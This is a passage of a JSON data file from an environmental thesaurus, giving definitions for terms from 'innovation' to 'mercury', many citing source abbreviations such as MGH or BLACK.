rivers, channels or lakes.\"], \"innovation\": [\"Something newly introduced, such as a new method or device.\"], \"inorganic chemistry\": [\"A branch of chemistry dealing with the chemical reactions and properties of all inorganic matter.\\\\n(Source: LEE)\"], \"inorganic substance\": [\"Chemical compound that does not contain carbon as the principal element (excepting carbonates, cyanides, and cyanates).\\\\n(Source: MGH)\"], \"insecticide\": [\"Any chemical agent used to destroy invertebrate pests.\"], \"insectivore\": [\"(Insectivora) Order of placental mammals, being typically small, with simple teeth, and feeding on invertebrates.\", \"An animal with a diet that consists chiefly of insects and similar small creatures.\"], \"in situ\": [\"In the natural or normal place.\"], \"inspection\": [\"An official examination and evaluation of the extent to which specified goals, objectives, standards, policies or procedures of an agency, organization, department or unit have been met properly.\"], \"inspection service\": [\"An organization designated to look into, supervise and report upon, the staff members and workings of some institution or department, or the conforming to laws and regulations by a segment of society or other group.\\\\n(Source: OED)\"], \"sound insulation material\": [\"Material used to reduce the transmission of sound to or from a body, device, room, etc.\"], \"insurance\": [\"An agreement of providing financial protection contingencies, such as death, loss or damage and involving payment of regular premiums in return for a policy guaranteeing such protection.\", \"The business of providing a financial protection against most losses or harm to a person, property or a firm in return for premiums paid.\"], \"insurance coverage\": [\"The protection provided against risks or a risk, often as specified by the type of protection or the item being protected.\"], \"intensive farming\": [\"Farming in which as much use is made of the land as possible by growing crops close together or by growing several crops in a year or by using large amounts of fertilizers.\\\\n(Source: PHC)\"], \"interaction of pesticides\": [\"The enhancement of activity of pesticides when they are used in combination with others.\\\\n(Source: PARCOR)\"], \"interchange of electronic data\": [\"A transference of binary coded information items between two or more computers across any communications channel capable of carrying electromagnetic signals.\"], \"interdisciplinary research\": [\"The utilisation, combination and coordination of two or more appropriate disciplines, technologies and humanities in an integrated approach toward problems.\"], \"interest\": [\"A sum paid or charged for the use of money or for borrowing money over a given time period.\", \"A great attention and concern from someone or something.\", \"That which affects one's welfare or happiness.\", \"To attract attention or concern; to excite the curiosity of; to engage the interest of.\", \"To be on the mind of.\", \"To be of importance or consequence.\"], \"interest group\": [\"A group of people who share common traits, attitudes, beliefs or objectives and who have formed a formal organization to serve specific concerns of the membership.\"], \"interlaboratory comparison\": [\"Tests performed at the same time in different laboratories to validate the quality of the results.\"], \"international agreement\": [\"Cooperation in international efforts to support global goals.\"], \"international competitiveness\": [\"The ability of firms to strive with rivals in the production and sale of commodities in worldwide markets.\\\\n(Source: ODE / OED)\"], \"international convention\": [\"Treaties and other agreements of a contractual character between different countries or organizations of states creating legal rights and obligations between the parties.\"], \"International Court of Justice\": [\"Judicial arm of the United Nations. It has jurisdiction to give advisory opinions on matters of law and treaty construction when requested by the General Assembly, Security Council or any other international agency authorised by the General Assembly to petition for such opinion. It has jurisdiction, also, to settle legal disputes between nations when voluntarily submitted to it.\\\\n(Source: BLACK)\"], \"international law\": [\"The system of law regulating the interrelationship of sovereign states and their rights and duties with regard to one another.\"], \"international safety\": [\"Freedom from danger or the quality of averting risk of harm to persons, property or the environment shared across one or more national boundaries; consequently, the combined efforts of more than one nation to achieve or preserve that state.\\\\n(Source: OED / RHW)\"], \"international trade\": [\"The flow of commodities and goods between nations.\"], \"interpretation method\": [\"Method employed in the assessment of the meaning and significance of data, results, facts, etc.\"], \"intertidal zone\": [\"The area between land and sea which is regularly exposed to the air by the tidal movement of the sea.\"], \"inventory\": [\"A detailed list of articles, goods, property, etc.\"], \"inversion\": [\"A reversal in the usual direction of a process, as in the change of density of water at 4\\u00b0 C.\\\\n(Source: PITT)\"], \"inversion layer\": [\"The atmosphere layer through which an inversion occurs.\"], \"invertebrate\": [\"Any animal lacking a backbone, including all species not classified as vertebrates.\", \"Lacking a backbone.\"], \"investment\": [\"Any item of value purchased for profitable return, as income, interest or capital appreciation.\"], \"in vitro assay\": [\"Assay taking place in an artificial environment.\"], \"in vivo assay\": [\"Experiment that is carried out in the living organism.\"], \"iodine\": [\"A nonmetallic halogen element; the poisonous, corrosive dark plates or granules are readily sublimed; insoluble in water, soluble in common solvents; used as germicide and antiseptic, in dyes, tinctures, and pharmaceuticals, in engraving lithography, and as a catalyst and analytical reagent.\"], \"ion exchange\": [\"The process in which ions are exchanged between a solution and an insoluble solid, usually a resin.\"], \"ion exchanger\": [\"A permanent insoluble material (usually a synthetic resin) which contains ions that will exchange reversibly with other ions in a surrounding solution.\"], \"ionosphere\": [\"A region of the earth's atmosphere, extending from about 60 to 1000 kilometers above the earth's surface, in which there is a high concentration of free electrons and ions formed as a result of ionizing radiation entering the atmosphere from space.\"], \"ion\": [\"An electrically charged atom or group of atoms formed by the loss or gain of one or more electrons.\"], \"iron\": [\"A malleable ductile silvery-white ferromagnetic metallic element with symbol Fe and atomic number 26, occurring principally in haematite and magnetite. It is widely used for structural and engineering purposes.\", \"Made out of iron.\", \"A small appliance used in ironing to remove wrinkles from fabric.\", \"To remove wrinkles from fabric.\"], \"irradiation\": [\"Exposure to or treatment with light or other electromagnetic radiation or with beams of particles.\"], \"irrigation\": [\"The act of supplying land with water so that crops and plants will grow or grow stronger.\"], \"irrigation canal\": [\"A permanent irrigation conduit constructed to convey water from the source of supply to one or more farms.\"], \"irrigation farming\": [\"Farming based on the artificial distribution and application of water to arable land to initiate and maintain plant growth.\\\\n(Source: GOODa)\"], \"island\": [\"A land mass, especially one smaller than a continent, entirely surrounded by water.\", \"A barrier on roads and highways between the opposing flows of traffic, usually covered with vegetation.\", \"Area in the middle of a road where pedestrians can wait while crossing.\"], \"island ecosystem\": [\"Unique but fragile and vulnerable ecosystem due to the fact that the evolution of their flora and fauna has taken place in relative isolation. Many remote islands have some of the most unique flora in the world; some have species of plants and animals that are not found anywhere else, which have evolved in a specialized way, sheltered from the fierce competition that species face on mainland.\"], \"isomer\": [\"Two or more compounds having the same molecular formula, but a different arrangement of atoms within the molecule. (Source: CED /  MGH)\", \"One of two or more chemical substances having the same elementary percentage composition and molecular weight but differing in structure, and therefore in properties; there are many ways in which such structural differences occur.\\\\n(Source: CED /  MGH)\"], \"isotope\": [\"Any of two or more atoms with the same atomic number that contain different numbers of neutrons.\"], \"ivory\": [\"The fine-grained creamy-white dentine forming the tusks of elephants, and the teeth or tusks of certain other large animals such as the walrus; it has long been esteemed for a wide variety of ornamental articles.\\\\n(Source: BJGEO)\"], \"joint debtor\": [\"Persons united in a joint liability or indebtedness. Two or more persons jointly liable for the same debt.\"], \"judicial assistance\": [\"A program sponsored or administered by a government to guide through and represent in court proceedings persons who are in financial need and cannot afford private counsel.\\\\n(Source: BLD)\"], \"judicial body\": [\"Any public organization or branch of government responsible for the administration of justice or the enforcement of laws.\\\\n(Source: BLD)\"], \"jurisdiction\": [\"The power of a court to hear and decide a case or give a certain punishment or sanction.\", \"The area or territory where a particular person or group of people (such as a court) has the right to excersise their legal authority.\"], \"jurisprudence\": [\"The science or philosophy of law.\"], \"karst\": [\"A geological formation resulting from the erosion of carbonate rocks.\"], \"stocking\": [\"A soft garment worn on the foot and lower leg, usually knit or woven, worn under shoes or other footwear.\"], \"kerosene\": [\"Higly refined kerosene used as fuel for jet engines.\", \"Higly refined sulphurless kerosene used for kerosene lamps, lanterns and portable stoves and produces very little soot.\"], \"laboratory\": [\"A room or building with scientific equipment for doing scientific tests or for teaching science, or a place where chemicals or medicines are produced.\"], \"laboratory experiment\": [\"Experimental tests or investigations carried out in a laboratory.\\\\n(Source: CEDa)\"], \"laboratory research\": [\"Research carried out in a laboratory for testing chemical substances, growing tissues in cultures, or performing microbiological, biochemical, hematological, microscopical, immunological, parasitological tests, etc.\\\\n(Source: PHC)\"], \"laboratory technique\": [\"The sum of procedures used on natural sciences such as chemistry, biology, physics in order to conduct an experiment, all of them following the scientific method.\"], \"laboratory waste\": [\"Discarded materials produced by analytical and research activities in a laboratory.\\\\n(Source: ERG)\"], \"lacquer\": [\"A material which contains a substantial quantity of a cellulose derivative, most commonly nitrocellulose but sometimes a cellulose ester, such as cellulose acetate or cellulose butyrate, or a cellulose ether such as ethyl cellulose; used to give a glossy finish, especially on brass and other bright metals.\"], \"lagoon\": [\"A body of water cut off from the open sea by coral reefs or sand bars.\"], \"lake basin\": [\"The depression in the Earth's surface occupied or formerly occupied by a lake.\"], \"lake pollution\": [\"The direct or indirect human alteration of the biological, physical, chemical or radiological integrity of lake water, or a lake ecosystem.\\\\n(Source: Landy)\"], \"lake\": [\"An enclosed body of water, usually but not necessarily fresh water, from which the sea is excluded.\"], \"lamp\": [\"A device for producing light.\"], \"land\": [\"A specified geographical tract of the Earth's surface including all its attributes, comprising its geology, superficial deposits, topography, hydrology, soils, flora and fauna, together with the results of past and present human activity, to the extent that these attributes exert a significant influence on the present and future land utilization.\\\\n(Source: WHIT)\", \"The range occupied by a community or other group.\", \"To descend to a surface, especially from the air; to arrive on shore.\", \"The part of Earth which is not covered by oceans or other bodies of water.\", \"A partitioned and measurable area on the Earth which is owned.\", \"Area that is suitable for farming.\", \"In a compact disc or similar recording medium, an area of the medium which does not have pits.\", \"The space between the rifling grooves in a gun.\", \"A strip area in a field between furrows made for irrigation.\", \"The geographic area under the control of a political state.\", \"Territorial possessions.\", \"To descend, reach or come to rest.\", \"To deliver (a blow).\"], \"land and property register\": [\"The system of registering certain legal estates or interests in land. It describes the land and any additional rights incidental to it, such as rights of way over adjoining land.\\\\n(Source: DICLAW)\"], \"land clearing\": [\"Removal of trees, undergrowth, etc. in preparation for ploughing, building, etc.\"], \"land consolidation\": [\"Joining small plots of land together to form larger farms or large fields.\"], \"land cover\": [\"Interface between the earth's crust and the atmosphere made of a combination of vegetation, soil, rock, water and human-made structures.\"], \"land ecology\": [\"Study of the relationship between terrestrial organisms and their environment.\"], \"landfill\": [\"A site where garbage is collected and buried.\"], \"landfill covering\": [\"The protective shielding, consisting of soil or some other material, that encloses disposal sites for waste to minimize the chance of releasing hazardous substances into the environment.\"], \"landfill degasification\": [\"Landfill gas is highly dangerous as methane is highly explosive; therefore it must be controlled at all operational landfill sites, whether by active or passive ventilation or both especially in the case of deep sites. There exist venting systems for shallow and deep sites respectively.\\\\n(Source: PORT)\"], \"landform\": [\"Any physical, recognizable form or feature of the Earth's surface, having a characteristic shape and produced by natural causes; it includes major forms such as plane, plateau and mountain, and minor forms such as hill, valley, slope, esker, and dune. Taken together the landforms make up the surface configuration of the Earth's.\\\\n(Source: BJGEO)\"], \"land mammal\": [\"Mammal that lives on shore.\"], \"land planning\": [\"The activity of designing, organizing or preparing for the future use of solid areas of the earth's surface, especially regions valued for natural resources, utilized as agricultural resources or considered for human settlement.\\\\n(Source: RHW)\"], \"land register\": [\"A public register containing information on the land and landowners.\"], \"landscape\": [\"The traits, patterns, and structure of a specific geographic area.\", \"A mode of printing where the horizontal sides are longer than the vertical sides.\"], \"landscape architecture\": [\"The creation, development, and decorative planting of gardens, grounds, parks, and other outdoor spaces.\"], \"landscape conservation\": [\"The safeguarding, for public enjoyment, of landscape and of opportunities for outdoor recreation, tourism and similar activities; the concept includes the preservation and enhancement not only of what has been inherited but the provision of new amenities and facilities.\"], \"landscape ecology\": [\"The study of landscapes taking account of the ecology of their biological populations. The subjects thus embraces geomorphology and ecology and is applied to the design and architecture of landscapes.\\\\n(Source: ALL2)\"], \"landslide\": [\"Mass-movement landforms and processes involving the downslope transport, under gravitationary influence of soil and rock material en masse.\"], \"land value\": [\"The monetary or material worth in commerce or trade of an area of ground considered as property.\"], \"laser\": [\"A device that produces a powerful, highly directional, monochromatic, coherent beam of light.\"], \"laundering\": [\"The act of washing and ironing clothes, linen, etc.\"], \"law amendment\": [\"An alteration of or addition to any statute with legal force that, if approved by the appropriate legislative authority, supersedes the original statute.\"], \"law enforcement\": [\"Any variety of activities associated with promoting compliance and obedience to the binding rules of a state, especially the prevention, investigation, apprehension or detention of individuals suspected or convicted of violating those rules.\"], \"leaching\": [\"1) The process of separating a liquid from a solid (as in waste liquid by percolation into the surrounding soil. \\\\n2) Extraction of soluble components of a solid mixture by percolating a solvent through it.\\\\n3) To lose or cause to lose soluble substances by the action of a percolating liquid.\"], \"lead\": [\"A heavy toxic bluish-white metallic element with symbol Pb and atomic number 82 that is highly malleable; occurs principally as galena and is used in alloys, accumulators, cable sheaths, paints, and as a radiation shield.\", \"To be ahead of others, e.g., in a race.\", \"The distance that a shooter aims ahead of a moving target in order to hit it with the projectile.\", \"To treat with lead.\", \"To move ahead (of others) in time or space.\", \"A small stick of graphite used in pencil that leaves marks when rubbed against a surface.\"], \"lead compound\": [\"A chemical compound present as gasoline additives, in paint, ceramic products, roofing, caulking, electrical applications, tubes, or containers. Lead exposure may be due to air, water, food, or soil. Lead in the air is primarily due to lead-based fuels and the combustion of solid waste, coal, oils, and emissions from alkyl lead manufacturers, wind blown dust volcanoes, the burning of lead-painted surfaces, and cigarette smoke. Lead in drinking water comes from leaching from lead pipes, connectors, and solder in both the distribution system and household plumbing.\\\\n(Source: KOREN)\"], \"lead level in blood\": [\"A measure of the amount of lead or lead salts absorbed by the body as a possible sign of acute or chronic lead poisoning, which can affect the nervous, digestive or muscular systems.\"], \"leaf\": [\"The main organ of photosynthesis and transpiration in higher plants, usually consisting of a flat green blade attached to the stem directly or by a stalk.\", \"A sheet of a book, magazine, etc (consisting of two pages, one on each face of the leaf).\"], \"leakage\": [\"The accidental, uncontrolled discharge or seepage of liquids, gases and other substances to unintended and unwanted locations, frequently causing risks of damage or harm to persons, property or the environment.\"], \"leather\": [\"The dressed or tanned hide of an animal, usually with the hair removed.\"], \"leather industry\": [\"Industry for the production of leather goods such as garments, bags, etc.\"], \"legal basis\": [\"The fundamental law or judicial precedent that warrants or supports a subsequent decision or action by any governmental, corporate or private entity.\"], \"legal regulation\": [\"Any order or rule issued by a government stipulating its procedures for the creation, execution or adjudication of laws.\"], \"legal remedy\": [\"The means by which a right is enforced or the violation of a right is prevented, redressed, or compensated.\\\\n(Source: BLACK)\"], \"legal text\": [\"The exact wording or language of a law or other document in conformity with the law or having the authority of law.\\\\n(Source: BLD)\"], \"legislation\": [\"The act or process of making laws.\"], \"legislative authority\": [\"The power of a deliberative assembly of persons or delegates to bring a bill, resolution or special act to an official, legally binding status.\\\\n(Source: RHW)\"], \"legislative competence\": [\"The skill, knowledge, qualification, capacity or authority to make, give or enact rules with binding force upon a population or jurisdiction.\"], \"legislature\": [\"The department, assembly, or body of persons that makes statutory laws for a state or nation.\"], \"leisure time\": [\"Time free from work or other duties; spare time.\"], \"lepidopteran\": [\"Any insect of the order Lepidoptera that has a slender body with clubbed antennae and typically rests with the wings (which are often brightly coloured) closed over the back.\"], \"levy\": [\"A ratable portion of the produce of the property and labor of the individual citizens, taken by the nation, in the exercise of its sovereign rights, for the support of government, for the administration of the laws, and as the means for continuing in operation the various legitimate functions of the state.\"], \"lexicon\": [\"The vocabulary of a particular sphere of activity, region, social class or individual, or the total set of morphemes or meaningful units of a language and its words.\"], \"liability\": [\"Subjection to a legal obligation. Liability is civil or criminal according to whether it is enforced by the civil or criminal courts.\", \"Responsibility to someone or for some activity.\", \"An obligation to pay money to another party.\", \"The quality of being something that holds you back.\"], \"library\": [\"Place where books and other literary materials are kept.\", \"A collection of subroutines used to develop software.\"], \"lichen\": [\"Composite organisms formed by the symbiosis between species of fungi and an algae.\"], \"life cycle\": [\"The phases, changes, or stages through which an organism passes throughout its lifetime.\", \"The useful life of a product or system; the developmental history of an individual or group in society.\"], \"life science\": [\"A science based on living organisms collectively.\"], \"lifestyle\": [\"The particular attitudes, habits or behaviour associated with an individual or group.\"], \"light\": [\"A device for producing light.\", \"Electromagnetic radiation that is capable of causing a visual sensation.\", \"To start (a fire).\", \"To give light to (something).\", \"Of low weight.\", \"Object, natural or artificial, that produces light.\", \"Having colors relat\\u0131vely near white.\", \"(of the military or industry) using (or being) relatively small or light weapons or equipment.\", \"Low in degree or quantity or number (e.g. of rain, snow, accent).\", \"Psychologically light; especially free from sadness or troubles.\", \"Low in fat, calories, alcohol, salt, etc.\", \"(used of soil) loose and large-grained in consistency.\"], \"lighting\": [\"The supply of illumination in streets or dwellings.\"], \"separator of light liquids\": [\"A mechanical device for separating and removing residues from fuel and lubricating oil from waste water coming from filling stations and industrial plants in order to avoid pollution of water bodies; this system is based on the different specific weights of water and fuel residues that float on the water and can be easily removed.\"], \"lignite\": [\"Coal of relatively recent origin consisting of accumulated layers of partially decomposed vegetation, intermediate between peat and bituminous coal; often contains patterns from the wood from which it formed.\\\\n(Source: MGH /  CED /  WRIGHT)\"], \"lignite mining\": [\"Extraction of brown coal from natural deposits; lignite is a brownish-black solid fuel in the second stage in the development of coal. It has a little over half the heating value of bituminous or anthracite coal.\\\\n(Source: KORENa)\"], \"lime\": [\"Any of various mineral and industrial forms of calcium oxide differing chiefly in water content and percentage of constituent such as silica, alumina and iron.\", \"A green citrus fruit\"], \"limestone\": [\"A sedimentary rock consisting chiefly of calcium carbonate, primarily in the form of the mineral calcite and with or without magnesium carbonate.\"], \"limnology\": [\"The study of bodies of fresh water with reference to their plant and animal life, physical properties, geographical features, etc.\\\\n(Source: CED)\"], \"linear source of sound\": [\"Point noise sources placed one after the other one as, for instance, in a row of cars moving on a road.\\\\n(Source: VALAMB)\"], \"line source\": [\"A source of air, noise, water contamination or electromagnetic radiation that emanates from a linear source such as a road.\"], \"lipid\": [\"One of a class of compounds which contain long-chain aliphatic hydrocarbons and their derivatives, such as fatty acids, alcohols, amines, amino alcohols, and aldehydes; includes waxes, fats, and derived compounds.\\\\n(Source: MGH)\"], \"liquefied gas\": [\"A gaseous compound or mixture converted to the liquid phase by cooling or compression; examples are liquefied petroleum gas (LPG), liquefied natural gas (LNG), liquid oxygen, and liquid ammonia.\"], \"liquid manure\": [\"Any fertilizer substance with a moisture content of over ninety percent, usually consisting of animal excrement with water added.\", \"Liquid excrements of animals and people, accumulated for reuse as fertilizer.\"], \"liquid state\": [\"A state of matter intermediate between that of crystalline substances and gases in which a substance has the capacity to flow under extremely small shear stresses and conforms to the shape of a confining vessel, but is relatively incompressible, lacks the capacity to expand without limit, and can posses a free surface.\"], \"literature\": [\"Written material such as poetry, novels, essays, especially works of imagination characterized by excellence of style and expression and by themes of general or enduring interest.\"], \"literature data bank\": [\"A fund of information on a particular subject or group of related subjects, divided into discrete documents and usually stored in and used with a computer system.\\\\n(Source: RHW)\"], \"literature study\": [\"The identification, description, analysis and classification of books and other materials used or consulted in the preparation of a work.\\\\n(Source: WEBSTE)\"], \"lithosphere\": [\"The solid portion of the Earth, as compared with the atmosphere and the hydrosphere.\\\\n(Source: BJGEO)\"], \"litter\": [\"Straw, hay or similar material used as bedding by animals.\", \"Small pieces of garbage, such as cans, bottles and wrappings, that people have left in a public place.\", \"A seat mounted on a frame with two poles on which a person can be carried.\"], \"littoral\": [\"The intertidal zone of the seashore.\"], \"livestock\": [\"Cattle, horses, and similar animals kept for domestic use especially on a farm.\"], \"livestock breeding\": [\"The raising of livestock by crossing different varieties to obtain new varieties with desired characteristics.\"], \"livestock farming\": [\"Breeding of cattle, horses and similar animals.\"], \"living space\": [\"Any room, structure or area used as a residence and associated with subsistence activities, including sleeping, relaxing or eating.\"], \"lizard\": [\"(Sauria) A reptile of the order Squamata.\", \"Any reptile of the suborder Lacertilia, especially those of the family Lacertidae, typically having an elongated body, four limbs, and a small tail: includes the gechos, iguanas, chameleons, monitors, and slow worms.\"], \"load bearing capacity\": [\"The maximum load that a system can support before failing.\"], \"teleheating\": [\"The supply of heat, either in the form of steam or hot water, from a central source to a group of buildings.\"], \"local traffic\": [\"Traffic moving within a city, town, or area and subject to frequent stops, as distinguished from long distance traffic.\"], \"locomotive\": [\"A self-propelled engine driven by steam, electricity or diesel power and used for drawing trains along railway tracks.\"], \"long-distance traffic\": [\"Traffic moving over extended areas, great distances and usually not subject to frequent stops.\"], \"long-term effect\": [\"Effect which will last long after the cause has ceased.\"], \"long-term trend\": [\"The prevailing tendency or general direction expected for some observed value over a lengthy and extended period of time, often determined by studying and analyzing statistical data.\"], \"lorry\": [\"A large motor vehicle of more than 3,500 kilograms designed for carrying cargo.\", \"Any motor vehicle designed for carrying cargo, including vans and pickups.\", \"Small rail car wihout cover to transport goods out of mines or quarries.\"], \"loss\": [\"The result of a business operation where overhead costs are greater than the receipts or income.\\\\n(Source: ISEP /  ODE)\", \"The act of being defeated and losing something, such as a match.\"], \"loss of biotope\": [\"Destruction of biotopes produced by environmental degradation which in turn is caused by air- or water-borne pollution.\\\\n(Source: WPR)\"], \"loudness\": [\"The magnitude of the physiological sensation produced by a sound, which varies directly with the physical intensity of sound but also depends on frequency of sound and waveform.\"], \"low-cost housing\": [\"Residences built at minimal expense and designed to keep the rental rate or price of purchase affordable for persons with limited means, usually determined by an annual income level set below the local median.\"], \"Lower House\": [\"The body of a bicameral legislature composed of representatives elected by the general populace and organized into electorates or districts, each comprising an equal number of citizens.\\\\n(Source: CIV)\"], \"low-level flight\": [\"Flying at low altitude.\"], \"low-level technology\": [\"Any relatively unsophisticated technical equipment or method with an amplitude or functionality below what is available in a similar or comparable system.\\\\n(Source: RHW / APD)\"], \"lubricant\": [\"A substance used to reduce friction between parts or objects in relative motion.\\\\n(Source: MGH)\"], \"luminosity\": [\"The functional relationship between stellar magnitude and the number and distribution of stars of each magnitude interval. Also known as relative luminosity factor.\", \"The ability of emitting or reflecting light.\"], \"lye\": [\"The alkaline solution that is obtained from the leaching of wood ashes.\\\\n(Source: MGH)\"], \"lymphatic system\": [\"A system of vessels and nodes conveying lymph in the vertebrate body, beginning with capillaries in tissue spaces and eventually forming the thoracic ducts which empty in the subclavian veins.\\\\n(Source: MGH)\"], \"lysimetry\": [\"The measurement of the water percolating through soils and the determination of the materials dissolved by the water.\"], \"machine manufacture\": [\"The making or production of mechanical apparatuses used for commercial or industrial purposes, such as engines and turbines, elevators and conveying equipment, computers and office equipment, and hoists, cranes and industrial trucks.\"], \"macroeconomic goal\": [\"An aim or objective pertaining to the production, distribution and use of income, wealth and commodities in a country, region or other large area, typically concerned with governmental fiscal and monetary policy as it affects employment, consumption, investment and growth levels.\\\\n(Source: ODE)\"], \"macroeconomics\": [\"Modern economic analysis that is concerned with data inaggregate as opposed to individual form such as national income, consumption and investment.\"], \"magnetic tape\": [\"A plastic, paper, or metal tape that is coated or impregnated with magnetizable iron oxide particles, used in magnetic recording.\\\\n(Source: MGH)\"], \"magnetism\": [\"A class of physical phenomena associated with moving electricity, including the mutual mechanical forces among magnets and electric currents.\"], \"mailing list\": [\"A series of addresses or e-mail addresses to which solicited or unsolicited mass mailings can be sent.\\\\n(Source: RHW)\"], \"malaria\": [\"A group of human and animal febrile diseases with a chronic relapsing course caused by hemosporidian blood parasites of the genus Plasmodium, transmitted by the bite of Anopheles mosquito.\"], \"malformation\": [\"Permanent structural change that may adversely affect survival, development or function.\\\\n(Source: KOREN)\"], \"malnutrition\": [\"Defective nutrition due to inadequate intake of nutrients or to their faulty digestion, assimilation or metabolism.\"], \"mammal\": [\"Any animal of the Mammalia class, a class of warm-blooded vertebrates having a thoracic diaphragm, a four-chambered heart and in which the females feed the young with their own milk.\"], \"management\": [\"The management or direction of the affairs of a public or private office, business or organization.\", \"Government, control, superintendence, physical or manual handling or guidance; act of managing by direction or regulation, or administration, as management of family, or of household, etc.\\\\n(Source: BLACK)\"], \"mandate\": [\"A command or authorization to act in a particular way given by an administrator to a subordinate, a court to a lower court or an electorate to its representative.\\\\n(Source: RHW)\"], \"mangrove\": [\"Any of various tropical evergreen trees or shrubs that grow in shallow coastal water; Plants of the Rhizophoraceae family and/or of the genus Rhizophora.\"], \"mangrove swamp\": [\"A wet, spongy area of land in tropical climates and along coastal regions that is dominated by mangrove trees and shrubs, particularly red mangroves (Rhizophora), black mangroves (Avicennia) and white mangroves (Laguncularia).\"], \"man-made climate change\": [\"Man-made climate changes due to the greenhouse effect and other human activities.\"], \"man-nature relationship\": [\"The interrelationship between human activity and geographical environment.\"], \"manpower\": [\"The power generated by a man working.\"], \"manufacturing trade\": [\"The process or act of exchanging, buying or selling any manufactured product, or the raw materials for any manufacturing process.\\\\n(Source: RHW /  ISEP)\"], \"manure\": [\"Animal excreta collected from stables and barnyards with or without litter; used to enrich the soil.\"], \"map\": [\"A representation, normally on a flat medium, that displays the physical and political features of a surface area of the earth, showing them in their respective forms, sizes and relationships according to some convention of representation.\", \"The visual representation of a person or an object.\", \"Representation of the location of datasets in a computer memory to speed up access and visualization.\"], \"mapping\": [\"The process of making a map of an area; especially the field work necessary for the production of a map.\", \"Representation of the location of datasets in a computer memory to speed up access and visualization.\"], \"mapping of lichens\": [\"Maps of lichens distribution indicating air quality. Fruticose lichens (with branched structures well above the surface) are more susceptible to SO2 damage than foliose lichens (whose leaflike thallus lies nearly flat on surface) and both in turn are more susceptible than crustose lichens (which embed their tissue in the cracks of bark, soil, or rocks). The use of morphological lichen types as indicators of air pollution concentrations is well developed.\\\\n(Source: WESTM)\"], \"marble\": [\"Metamorphic rock composed of recrystallized calcite or dolomite.\"], \"marginal land\": [\"Low quality land the value of whose production barely covers its cultivation costs.\"], \"mariculture\": [\"Cultivation of marine organisms in their natural habitats, usually for commercial purposes.\"], \"marina\": [\"A small port that is used for pleasure rather than trade, often with hotels, restaurants and bars.\"], \"marine biology\": [\"A branch of biology that deals with those living organisms which inhabit the sea.\\\\n(Source: MGH)\"], \"marine ecology\": [\"An integrative science that studies the basic structural and functional relationships within and among living populations and their physical-chemical environments in marine ecosystems. Marine ecology focuses on specific organisms as well as on particular environments or physical settings.\"], \"marine ecosystem\": [\"Any marine environment, from pond to ocean, in which plants and animals interact with the chemical and physical features of the environment.\"], \"marine engineering\": [\"The design, construction, installation, operation, and maintenance of main power plants, as well as the associated auxiliary machinery and equipment, for the propulsion of ships.\\\\n(Source: MGH)\"], \"marine environment\": [\"The oceans, seas, bays, estuaries, and other major water bodies, including coastal marine and nearshore zones.\"], \"marine fauna\": [\"Animals which live in the sea.\"], \"marine fishery\": [\"The harvest of animals and plants from the ocean to provide food and recreation for people, food for animals, and a variety of organic materials for industry.\"], \"marine geology\": [\"That aspect of the study of the ocean that deals specifically with the ocean floor and the ocean-continent border, including submarine relief features, the geochemistry and petrology of the sediments and rocks of the ocean bottom and the influence of seawater and waves on the ocean bottom and its materials.\\\\n(Source: BJGEO)\"], \"marine pollution\": [\"Any detrimental alteration of the marine environment caused by the intentional or accidental release of dangerous or toxic substances, such as industrial, commercial and urban waste water.\"], \"marine reserve\": [\"Sea area where marine wildlife is protected.\"], \"marine sediment\": [\"Solid fragmental material, originated from weathering of rocks, that has settled down from a state of suspension in the water.\"], \"maritime law\": [\"That system of law which particularly relates to marine commerce and navigation, to business transacted at sea or relating to navigation, to ships and shipping, to seamen, to the transportation of persons and property by sea, and to marine affairs generally.\", \"The area of law that deals with ships at sea and the rights of sailors, passengers, and owners of cargo.\"], \"maritime navigation\": [\"Travelling on the sea by means of boats, ships, etc.\\\\n(Source: CEDa)\"], \"marker\": [\"Small amount of an easily detected substance that can be used to follow and quantify the flow of materials or movement of organisms not otherwise visible or detectable by ordinary means.\", \"A pen with a wide tip made of felt or fibre.\", \"An isotope of an element, a small amount of which may be incorporated into a sample of material in order to follow the course of that element through a chemical, biological, or physical process, and thus also follow the larger sample. The tracer may be radioactive, in which case observations are made by measuring the radioactivity.\\\\n(Source: ECHO1)\"], \"tracer\": [\"A minute quantity of radioactive isotope used in medicine or biology to study the chemical changes within living tissues.\", \"A person or thing that traces.\"], \"market\": [\"Place of commercial activity in which articles are bought and sold.\"], \"market economy\": [\"A mixed economy that relies heavily on markets to answer the three basic questions of allocation, but with a modest amount of government involvement. While it is commonly termed capitalism, market-oriented economy is much more descriptive of how the economy is structured.\\\\n(Source: AMOS2)\"], \"market form\": [\"The organizational form or structure of the trade or traffic of a particular commodity.\\\\n(Source: ISEP /  RHW)\"], \"marketing\": [\"A related group of business activities whose purpose is to satisfy the demands for goods and services of consumers, businesses and government.\"], \"market research\": [\"The systematic gathering, recording, computing, and analysing of data about problems relating to the sale and distribution of goods and services for certain time periods.\"], \"marsupial\": [\"Type of mammal with a pouch in which the young are carried.\"], \"material\": [\"The substance of which a product is made or composed.\", \"Worldly, as opposed to spiritual.\", \"Having to do with matter.\"], \"balance of matter\": [\"A calculation to inventory material inputs versus outputs in a process system.\"], \"material life cycle\": [\"All the stages involved in the manufacturing, distribution and retail, use and re-use and maintenance, recycling and waste management of materials.\"], \"materials science\": [\"The study of the nature, behaviour, and use of materials applied to science and technology.\"], \"mathematical analysis\": [\"The branch of mathematics most explicitly concerned with the limit process or the concept of convergence; includes the theories of differentiation, integration and measure, infinite series, and analytic functions.\\\\n(Source: MGH)\"], \"maximum immission concentration\": [\"The maximum concentration of air polluting substances in the free environment whose impact when of specified duration and frequency is not objectionable to man, fauna and flora.\\\\n(Source: ECHO2)\"], \"meadow\": [\"Strictly a term for a field of permanent grass used for hay, but also applied to rich, waterside grazing areas that are not suitable for arable cultivation.\\\\n(Source: GOOD)\", \"A piece of land covered or cultivated with grass, usually intended to be mown for hay.\"], \"measuring\": [\"The ability of the analytical method or protocol to quantify as well as identify the presence of the substance in question.\\\\n(Source: LEE)\"], \"meat\": [\"The edible flesh of animals, especially that of mammals.\"], \"mechanical engineering\": [\"The branch of engineering concerned with the design, construction, and operation of machines.\\\\n(Source: CED)\"], \"medical science\": [\"The science and art of treating and healing.\"], \"medicinal plant\": [\"Plants having therapeutic properties.\"], \"Mediterranean Area\": [\"The collective islands and countries of the inland sea between Europe, Africa and Asia that is linked to the Atlantic Ocean at its western end by the Strait of Gibraltar and includes the Tyrrhenian, Adriatic, Aegean and Ionian seas.\"], \"melting\": [\"A change of the state of a substance from the solid phase to the liquid phase. (Source: MGH)\"], \"membrane\": [\"A thin tissue that encloses or lines biological cells, organs, or other structures.\"], \"mercury\": [\"A heavy silvery-white toxic liquid metallic element 